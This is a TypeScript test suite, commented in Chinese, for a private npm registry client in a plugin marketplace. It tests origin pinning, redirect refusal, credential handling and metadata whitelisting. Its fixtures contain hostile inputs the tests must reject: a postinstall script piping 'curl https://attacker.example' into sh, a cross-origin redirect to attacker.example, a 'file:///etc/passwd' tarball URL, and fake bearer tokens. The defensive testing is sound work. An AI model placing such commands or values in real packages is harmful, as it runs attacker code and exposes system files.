import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { AppError } from "@fenix/platform-sdk";
import { initializeTestApplicationInfrastructure, resetAllStubs } from "@fenix/platform-sdk/testing";
import { PluginRegistryClient } from "../server/npm-registry/client";
import { LIMITS } from "../server/npm-registry/normalize";
import { getPluginRegistryClient } from "../server/npm-registry/service";
import {
  deeplyNested,
  type FixtureRegistry,
  jsonResponse,
  loopbackOnlyFetch,
  mcppMetadata,
  packumentFor,
  SRI_DIGEST,
  startFixtureRegistry,
} from "./fixtures";

/**
 * 私有源适配器的契约测试。
 *
 * 私有源同时是**不可信输入**与**外部依赖**，因此这里锁定三件事：接受什么、拒绝什么、以及**从不请求什么**。
 * 全部经 loopback 上的真实 HTTP 服务，URL 编码、状态处理与重定向策略因此是被真实验证的，而不是被假装的。
 *
 * 出网护栏经 `fetchImpl` **注入**（见 `fixtures.ts` 的 `loopbackOnlyFetch`），本文件不读写任何全局状态：
 * 同一进程里多个测试文件会替换 `globalThis.fetch` 且未必恢复（实测：替换全局的版本在单跑本文件时全绿，在
 * `bun test packages/` 下 26/39 失败，请求被别人的替身截走、根本没到 fixture）。因此连「配置 → 客户端」
 * 那条接线用例也自带传输（`getPluginRegistryClient({ fetchImpl })`），否则它只会在别人的执行顺序下才绿。
 *
 * 每条 `test` 上方的中文注释说明该用例锁定的业务契约；`describe` 只做分组，不重复契约描述。
 */

const NAME = "acme-investment-team";
const VERSION = "1.4.0";

let registry: FixtureRegistry;
let client: PluginRegistryClient;

/** 用例级私有源客户端：超时与体积上限取宽松值，除专门测它们的两条外都应成功。 */
const makeClient = (options: { token?: string | null; timeoutMs?: number; maxBytes?: number } = {}) =>
  new PluginRegistryClient({
    baseUrl: registry.baseUrl,
    token: options.token ?? null,
    timeoutMs: options.timeoutMs ?? 2000,
    maxBytes: options.maxBytes ?? 256 * 1024,
    fetchImpl: loopbackOnlyFetch(),
  });

const ref = (packageName = NAME, exactVersion = VERSION) => ({ sourceId: "npm", packageName, exactVersion });

/** 断言调用以某个错误码失败，并返回该错误以便进一步断言细节。 */
const codeOf = async (work: Promise<unknown>): Promise<string> => {
  try {
    await work;
  } catch (error) {
    if (error instanceof AppError) return error.code;
    throw error;
  }
  throw new Error("expected the call to fail");
};

beforeEach(() => {
  resetAllStubs();
  registry = startFixtureRegistry(() => jsonResponse(packumentFor({ name: NAME, version: VERSION })));
  client = makeClient();
});

afterEach(() => {
  registry.stop();
});

describe("fetching", () => {
  // 请求路径只能由校验过的包名派生：私有源请求不携带任何调用方提供的地址，否则市场会变成可被诱导读内网的代理。
  test("requests the validated package name and nothing else", async () => {
    await client.preview(ref());
    expect(registry.requests).toEqual([`/${NAME}`]);
  });

  // 带 scope 的包名必须编码成**一个**路径段，而不是被拆成 `/@acme/team`——后者会让上游按另一个包解析。
  test("encodes a scoped package name as one path segment", async () => {
    const scoped = "@acme/investment-team";
    registry.setHandler(({ packageName }) => jsonResponse(packumentFor({ name: packageName, version: VERSION })));
    const preview = await client.preview(ref(scoped));
    expect(preview.metadata.name).toBe(scoped);
    expect(registry.requests).toEqual([`/${encodeURIComponent(scoped)}`]);
  });

  // 市场只读元数据：永不请求 tarball，因此永不接触包内容。这是「展示声明而不是代码」这条边界的可测形式。
  test("never requests a tarball", async () => {
    await client.preview(ref());
    expect(registry.artifactRequests).toEqual([]);
  });

  // 摘要必须只由内容决定：同一份元数据两次读取得到同一个 digest，预览-确认流程才可能比对成功。
  test("keeps a snapshot digest stable for identical metadata", async () => {
    const first = await client.preview(ref());
    const second = await client.preview(ref());
    expect(second.metadataDigest).toBe(first.metadataDigest);
    expect(second.metadataJson).toBe(first.metadataJson);
  });

  // 元数据变化必须改变 digest：否则「确认时比对 digest」会放行一份管理员从未预览过的内容。
  test("changes the digest when the metadata changes", async () => {
    const first = await client.preview(ref());
    registry.setHandler(() => jsonResponse(packumentFor({ name: NAME, version: VERSION, description: "changed" })));
    const second = await client.preview(ref());
    expect(second.metadataDigest).not.toBe(first.metadataDigest);
  });
});

describe("transport failures", () => {
  // 包不存在是业务结果（可提示用户核对包名），不是服务故障，因此必须与「私有源挂了」区分开。
  test("maps a missing package to PACKAGE_NOT_FOUND", async () => {
    registry.setHandler(() => jsonResponse({ error: "Not found" }, 404));
    expect(await codeOf(client.preview(ref()))).toBe("PACKAGE_NOT_FOUND");
  });

  // 限流是「稍后重试可成」的信号，映射成独立码让前端给出重试引导而不是报错误。
  test("maps a rate limit to REGISTRY_RATE_LIMITED", async () => {
    registry.setHandler(() => new Response("slow down", { status: 429 }));
    expect(await codeOf(client.preview(ref()))).toBe("REGISTRY_RATE_LIMITED");
  });

  // 上游 5xx 与网络异常同归 REGISTRY_UNAVAILABLE：对调用方而言都是「私有源此刻读不到」。
  test("maps an upstream failure to REGISTRY_UNAVAILABLE", async () => {
    registry.setHandler(() => new Response("boom", { status: 503 }));
    expect(await codeOf(client.preview(ref()))).toBe("REGISTRY_UNAVAILABLE");
  });

  // 超时必须收敛成同一码：挂死的私有源不能把市场请求一起拖住，也不能表现为未分类异常（500）。
  test("maps a timeout to REGISTRY_UNAVAILABLE", async () => {
    registry.setHandler(async () => {
      await Bun.sleep(400);
      return jsonResponse({});
    });
    expect(await codeOf(makeClient({ timeoutMs: 60 }).preview(ref()))).toBe("REGISTRY_UNAVAILABLE");
  });

  // 非 JSON 响应（如反向代理返回的 HTML 错误页）不是元数据，拒绝而不是继续往下解析。
  test("rejects a body that is not JSON", async () => {
    registry.setHandler(() => new Response("<html></html>", { status: 200 }));
    expect(await codeOf(client.preview(ref()))).toBe("METADATA_INVALID");
  });

  // 响应体超限在**读取过程中**就被拒：等读完再判长度时，超大响应已经把进程内存吃掉。
  test("rejects a response larger than the byte limit", async () => {
    expect(await codeOf(makeClient({ maxBytes: 64 }).preview(ref()))).toBe("METADATA_TOO_LARGE");
  });

  // 错误里只允许出现错误类名，绝不回显上游文本——上游可能把请求细节（含凭据）写进响应体。
  test("does not surface upstream text in the error", async () => {
    registry.setHandler(() => new Response("Authorization: Bearer sk-live-9f2b7c1d4e6a8b0c", { status: 500 }));
    try {
      await client.preview(ref());
      throw new Error("expected the call to fail");
    } catch (error) {
      expect(error).toBeInstanceOf(AppError);
      expect(
        JSON.stringify({ message: (error as Error).message, ...((error as { details?: unknown }).details ?? {}) }),
      ).not.toContain("sk-live");
    }
  });
});

describe("redirect policy", () => {
  // 同源重定向是合法部署形态（私有源挂在反向代理后），必须跟随。
  test("follows a same-origin redirect", async () => {
    let hops = 0;
    registry.setHandler(({ url }) => {
      hops += 1;
      if (url.pathname.endsWith("-redirected")) return jsonResponse(packumentFor({ name: NAME, version: VERSION }));
      return new Response(null, { status: 302, headers: { location: `${url.pathname}-redirected` } });
    });
    const preview = await client.preview(ref());
    expect(preview.metadata.version).toBe(VERSION);
    expect(hops).toBe(2);
  });

  // 跨源重定向被拒：否则固定 origin 这条约束可被上游用 Location 头绕过，Bearer 凭据也会随之发往攻击者的 host。
  test("refuses a redirect to another origin", async () => {
    registry.setHandler(
      () => new Response(null, { status: 302, headers: { location: "https://attacker.example/packument" } }),
    );
    expect(await codeOf(client.preview(ref()))).toBe("REGISTRY_UNAVAILABLE");
  });

  // 重定向环由跳数上限终止：每一跳都指向同一 origin 上的新路径，URL 不会重复，只有上限能停下它。
  test("refuses a redirect loop", async () => {
    registry.setHandler(({ url }) => {
      const next = Number(url.searchParams.get("hop") ?? "0") + 1;
      return new Response(null, { status: 302, headers: { location: `/${NAME}?hop=${next}` } });
    });
    expect(await codeOf(client.preview(ref()))).toBe("REGISTRY_UNAVAILABLE");
  });
});

describe("registry credentials", () => {
  // 配置了 token 就必须随请求发出——私有源鉴权失败在部署侧只表现为 404/401，很难反查到是漏发凭据。
  test("sends the configured bearer token", async () => {
    // 用对象承载观测值：局部变量写在闭包里不会被 tsc 的流程分析追踪，断言处会退化成「初始值 null」。
    const seen: { authorization?: string | null } = {};
    registry.setHandler(({ request }) => {
      seen.authorization = request.headers.get("authorization");
      return jsonResponse(packumentFor({ name: NAME, version: VERSION }));
    });
    await makeClient({ token: "s3cret-token" }).preview(ref());
    expect(seen.authorization).toBe("Bearer s3cret-token");
  });

  // 未配置 token 时不得发出空的 authorization 头：`Bearer ` 会被部分网关判为「提供了错误凭据」而拒绝。
  test("omits the authorization header without a token", async () => {
    const seen: { authorization?: string | null } = { authorization: "unset" };
    registry.setHandler(({ request }) => {
      seen.authorization = request.headers.get("authorization");
      return jsonResponse(packumentFor({ name: NAME, version: VERSION }));
    });
    await client.preview(ref());
    expect(seen.authorization).toBeNull();
  });
});

describe("metadata validation", () => {
  // 版本不存在与包不存在是两回事：前者说明包名对但版本写错，提示文案与处置动作都不同。
  test("reports a version the package does not contain", async () => {
    registry.setHandler(() => jsonResponse(packumentFor({ name: NAME, version: "9.9.9" })));
    expect(await codeOf(client.preview(ref()))).toBe("VERSION_NOT_FOUND");
  });

  // 上游回了一个别的包时必须拒绝：静默接受会把另一个包的内容挂到本包身份下，是身份错配而非显示问题。
  test("rejects a packument for a different package", async () => {
    registry.setHandler(() => jsonResponse(packumentFor({ name: "someone-else", version: VERSION })));
    expect(await codeOf(client.preview(ref()))).toBe("METADATA_INVALID");
  });

  // 版本条目自身声明的版本号也必须与请求一致：索引键与内容不符时，摘要描述的不是可信内容。
  test("rejects a version entry whose version does not match", async () => {
    const mismatched = packumentFor({ name: NAME, version: VERSION });
    const versions = mismatched.versions as Record<string, unknown>;
    versions[VERSION] = { ...(versions[VERSION] as Record<string, unknown>), version: "2.0.0" };
    registry.setHandler(() => jsonResponse(mismatched));
    expect(await codeOf(client.preview(ref()))).toBe("METADATA_INVALID");
  });

  // mcpp 协议版本不认识就拒绝而不是尽力解析：按旧规则读新协议会静默丢掉新字段，落库一份残缺快照。
  test("rejects an unsupported mcpp schema version", async () => {
    registry.setHandler(() =>
      jsonResponse(packumentFor({ name: NAME, version: VERSION, mcpp: mcppMetadata({ schemaVersion: 2 }) })),
    );
    expect(await codeOf(client.preview(ref()))).toBe("UNSUPPORTED_SCHEMA_VERSION");
  });

  // 深嵌套在深度探测阶段就被拒：递归实现会被敌意结构打爆调用栈（表现为 500），而正确结果是「超限拒绝」。
  test("rejects deeply nested input instead of recursing", async () => {
    registry.setHandler(() =>
      jsonResponse(packumentFor({ name: NAME, version: VERSION, extraVersionFields: { deep: deeplyNested() } })),
    );
    expect(await codeOf(client.preview(ref()))).toBe("METADATA_TOO_LARGE");
  });

  // 成员数量有上界：否则一个包可以让每次列表渲染都背上任意大的载荷。
  test("rejects too many agents", async () => {
    registry.setHandler(() =>
      jsonResponse(
        packumentFor({
          name: NAME,
          version: VERSION,
          mcpp: mcppMetadata({
            agents: Array.from({ length: LIMITS.maxAgents + 1 }, (_, index) => ({
              id: `agent-${index}`,
              name: `Agent ${index}`,
            })),
          }),
        }),
      ),
    );
    expect(await codeOf(client.preview(ref()))).toBe("METADATA_TOO_LARGE");
  });

  // 成员 id 是包内的身份键，重复会让「按 id 引用某个成员」产生二义性，因此拒绝而不是去重。
  test("rejects a duplicate agent id", async () => {
    registry.setHandler(() =>
      jsonResponse(
        packumentFor({
          name: NAME,
          version: VERSION,
          mcpp: mcppMetadata({
            agents: [
              { id: "analyst", name: "One" },
              { id: "analyst", name: "Two" },
            ],
          }),
        }),
      ),
    );
    expect(await codeOf(client.preview(ref()))).toBe("METADATA_INVALID");
  });

  // 技能必须以 `skill://…/SKILL.md` 引用：允许 http(s) 会把市场变成任意 URL 的转发器（抓取与缓存都不在本期范围）。
  test("rejects an invalid package Skill URI", async () => {
    registry.setHandler(() =>
      jsonResponse(
        packumentFor({
          name: NAME,
          version: VERSION,
          mcpp: mcppMetadata({ skills: [{ uri: "https://example.com/SKILL.md", name: "analyst" }] }),
        }),
      ),
    );
    expect(await codeOf(client.preview(ref()))).toBe("METADATA_INVALID");
  });

  // 描述有长度上限且超限拒绝（不截断）：截断会让落库内容与管理员预览到的内容不一致。
  test("rejects an over-long description", async () => {
    registry.setHandler(() =>
      jsonResponse(
        packumentFor({ name: NAME, version: VERSION, description: "x".repeat(LIMITS.maxDescriptionLength + 1) }),
      ),
    );
    expect(await codeOf(client.preview(ref()))).toBe("METADATA_TOO_LARGE");
  });

  // tarball 只作溯源记录，但它的形状仍受约束：`file://` 一类地址一旦被前端当作可点链接就是本地文件读取。
  test("rejects a non-http tarball URL", async () => {
    registry.setHandler(() =>
      jsonResponse(packumentFor({ name: NAME, version: VERSION, tarball: "file:///etc/passwd" })),
    );
    expect(await codeOf(client.preview(ref()))).toBe("METADATA_INVALID");
  });

  // 元数据里嵌了凭据就整体拒绝（不是脱敏）：脱敏后的内容与管理员预览的不一致，digest 比对随之失去意义。
  test("rejects metadata that embeds a credential", async () => {
    registry.setHandler(() =>
      jsonResponse(
        packumentFor({
          name: NAME,
          version: VERSION,
          description: "Authorization: Bearer sk-live-9f2b7c1d4e6a8b0c2d4e",
        }),
      ),
    );
    expect(await codeOf(client.preview(ref()))).toBe("METADATA_INVALID");
  });

  // 真 SRI 必须原样保留：它本身就是长 base64，若走「≥64 连续 base64」的secret 启发式会被误杀，
  // 结果是每一个真实发布过的包都发不出来。
  test("keeps a real Subresource Integrity digest", async () => {
    const { metadata } = await client.preview(ref());
    expect(metadata.integrity).toBe(SRI_DIGEST);
  });

  // 但 integrity 也不能成为任意文本的载体：形状不对（这里塞的是凭据文本）即拒绝。
  test("rejects an integrity value that is not a digest", async () => {
    registry.setHandler(() =>
      jsonResponse(
        packumentFor({
          name: NAME,
          version: VERSION,
          integrity: "Authorization: Bearer sk-live-9f2b7c1d4e6a8b0c2d4e",
        }),
      ),
    );
    expect(await codeOf(client.preview(ref()))).toBe("METADATA_INVALID");
  });

  // 未列入白名单的字段（如 readme）永远不进快照——它是内联 base64 最可能的藏身处，也是「原始 packument 永不落库」的落地点。
  test("rejects metadata carrying inline base64 payloads", async () => {
    registry.setHandler(() =>
      jsonResponse(
        packumentFor({
          name: NAME,
          version: VERSION,
          extraVersionFields: { readme: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==" },
        }),
      ),
    );
    const preview = await client.preview(ref());
    expect(JSON.stringify(preview.metadata)).not.toContain("base64");
  });
});

describe("projection", () => {
  // 白名单投影的完整形状：这条断言就是「哪些内容可以离开外部源」的清单，任何新增字段都会让它失败。
  test("keeps only whitelisted fields", async () => {
    registry.setHandler(() =>
      jsonResponse(
        packumentFor({
          name: NAME,
          version: VERSION,
          description: "投资研究专家团队",
          keywords: ["mcpp", "investment"],
          deprecated: "use 2.0.0",
          unpackedSize: 4096,
          fileCount: 12,
          mcpp: mcppMetadata({
            displayName: "投资研究专家团队",
            summary: "连接市场数据，完成财报与行业研究",
            agents: [{ id: "financial-analyst", name: "财报解读顾问", description: "分析财务指标" }],
            skills: [
              {
                uri: "skill://financial-analysis/SKILL.md",
                name: "financial-analysis",
                description: "分析财务指标与估值假设",
              },
            ],
            servers: [{ id: "market-data", transport: "stdio", runtime: "client-local" }],
          }),
          extraVersionFields: {
            _npmUser: { name: "maintainer", email: "someone@example.com" },
            _npmOperationalInternal: { host: "npm" },
            scripts: { postinstall: "curl https://attacker.example | sh" },
          },
        }),
      ),
    );
    const { metadata } = await client.preview(ref());
    expect(metadata).toEqual({
      name: NAME,
      version: VERSION,
      description: "投资研究专家团队",
      keywords: ["mcpp", "investment"],
      displayName: "投资研究专家团队",
      summary: "连接市场数据，完成财报与行业研究",
      agents: [{ id: "financial-analyst", name: "财报解读顾问", description: "分析财务指标" }],
      skills: [
        {
          uri: "skill://financial-analysis/SKILL.md",
          name: "financial-analysis",
          description: "分析财务指标与估值假设",
        },
      ],
      servers: [{ id: "market-data", transport: "stdio", runtime: "client-local" }],
      integrity: SRI_DIGEST,
      tarballUrl: `https://registry.example.com/${NAME}/-/${NAME}-${VERSION}.tgz`,
      unpackedSizeBytes: 4096,
      fileCount: 12,
      deprecated: "use 2.0.0",
      publishedAt: "2026-08-01T00:00:00.000Z",
    });
    // 安装脚本与 npm 内部字段不得随快照离开：它们既不是声明，也不该出现在任何前端展示里。
    expect(JSON.stringify(metadata)).not.toContain("postinstall");
    expect(JSON.stringify(metadata)).not.toContain("_npmUser");
  });

  // 没有 mcpp 块的包是合法的「普通连接器」：它只是不声明成员与能力，不因此被拒。
  test("treats a missing mcpp block as a plain connector", async () => {
    const { metadata } = await client.preview(ref());
    expect(metadata.agents).toEqual([]);
    expect(metadata.servers).toEqual([]);
    expect(metadata.skills).toEqual([]);
    expect(metadata.displayName).toBeNull();
  });

  // 时间字段不可解析时留空而不是臆造日期：错误的发布时间会让「最近发布」排序给出误导性结果。
  test("ignores an unknown time field rather than inventing a date", async () => {
    const packument = packumentFor({ name: NAME, version: VERSION });
    delete packument.time;
    registry.setHandler(() => jsonResponse(packument));
    const { metadata } = await client.preview(ref());
    expect(metadata.publishedAt).toBeNull();
  });
});

describe("module configuration", () => {
  const configWith = (overrides: Record<string, unknown>) => ({
    sourceId: "npm",
    registryUrl: null,
    registryToken: null,
    registryTimeoutMs: 8000,
    registryMaxBytes: 4194304,
    ...overrides,
  });

  // 未配置私有源地址时只有「读源」这条路径失败，且必须是可辨识的专用错误码——它提示的是部署未配置，
  // 前端据此给出「联系管理员」而不是「稍后重试」。
  test("fails with REGISTRY_NOT_CONFIGURED when no registry url is configured", () => {
    initializeTestApplicationInfrastructure({ moduleConfigs: { "plugin-market": configWith({}) } });
    expect(() => getPluginRegistryClient()).toThrow("PLUGIN_MARKET_REGISTRY_URL");
    try {
      getPluginRegistryClient();
    } catch (error) {
      expect((error as AppError).code).toBe("REGISTRY_NOT_CONFIGURED");
      expect((error as AppError).statusCode).toBe(503);
    }
  });

  // 配置齐备时客户端可直接用于真实请求：这条把「模块配置 → 客户端 → 实际 HTTP」整条接线一次跑通，
  // 而漏接线（宿主没投影某个字段）只会让请求行为不对，不会在启动期报错，所以必须由用例兜住。
  // 传输仍由本用例注入（理由见文件头），被验证的是 origin、凭据与配置读取，不是「默认传输是哪个函数」。
  test("builds a working client from module config", async () => {
    initializeTestApplicationInfrastructure({
      moduleConfigs: {
        "plugin-market": configWith({ registryUrl: `${registry.baseUrl}/`, registryToken: "cfg-token" }),
      },
    });
    const seen: { authorization?: string | null } = {};
    registry.setHandler(({ request }) => {
      seen.authorization = request.headers.get("authorization");
      return jsonResponse(packumentFor({ name: NAME, version: VERSION }));
    });
    const preview = await getPluginRegistryClient({ fetchImpl: loopbackOnlyFetch() }).preview(ref());
    expect(preview.metadata.version).toBe(VERSION);
    expect(seen.authorization).toBe("Bearer cfg-token");
    expect(registry.requests).toEqual([`/${NAME}`]);
  });

  // 配置形状非法时立刻报字段路径且**不回显字段值**：该配置含凭据材料，错误信息会被日志与响应带走。
  test("reports the field path without echoing the token", () => {
    const secretValue = "zz-do-not-echo-zz";
    initializeTestApplicationInfrastructure({
      moduleConfigs: {
        "plugin-market": configWith({ registryUrl: "http://127.0.0.1:1", registryToken: secretValue, sourceId: "" }),
      },
    });
    expect(() => getPluginRegistryClient()).toThrow("sourceId");
    try {
      getPluginRegistryClient();
    } catch (error) {
      expect((error as Error).message).not.toContain(secretValue);
    }
  });
});

/**
 * 本套件只有在它真的不出网时才有意义：fixture 里带着 tarball URL 与外部 registry 域名。护栏已注入给本文件
 * 的每个客户端，这里把它的两个方向各证一次，而不是把它当成假设。
 */
describe("network boundary", () => {
  // 任何离开 loopback 的请求在开 socket 之前就被拒——否则「测试不打真实 registry」只是一句口头约定。
  test("refuses to reach a host outside the loopback interface", async () => {
    await expect(loopbackOnlyFetch()("https://registry.example.com/acme-team")).rejects.toThrow(
      /Test network access refused/,
    );
  });

  // 肯定方向：护栏放行 fixture 本身。拒绝一切会让整套契约测试失去意义，而那时全绿毫无信息量。
  test("allows the loopback fixture", async () => {
    const preview = await client.preview(ref());
    expect(preview.metadata.version).toBe(VERSION);
  });
});
